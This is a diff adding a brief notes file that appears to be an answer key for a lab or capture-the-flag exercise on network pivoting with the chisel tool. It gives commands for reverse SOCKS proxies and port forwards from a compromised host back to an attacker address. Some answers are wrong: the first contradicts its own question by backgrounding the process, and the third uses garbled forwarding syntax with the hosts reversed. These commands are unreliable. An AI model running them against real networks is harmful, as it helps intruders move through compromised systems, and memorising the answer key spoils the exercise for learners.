@@ -1,0 +1,18 @@
+
+									 Pivoting Chisel 
+								     -----------------------
+
+1. Use port 4242 for the listener and do not background the process?
+ans: ./chisel server -p 4242 --reverse &
+
+2. What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 
+   and backgrounding the process?
+ans: ./chisel client 172.16.0.200:4242 R:socks &
+
+3. How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 
+   and the listening port is 1337? Background this process?
+ans: ./chisel client 172.16.0.100:3306 R:33060.172.16.0.200:1337 &
+
+4. If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally 
+   and linking to 172.16.0.10:80?
+ans: ./chisel client 172.16.0.5:4444 8000:172.16.0.10:80
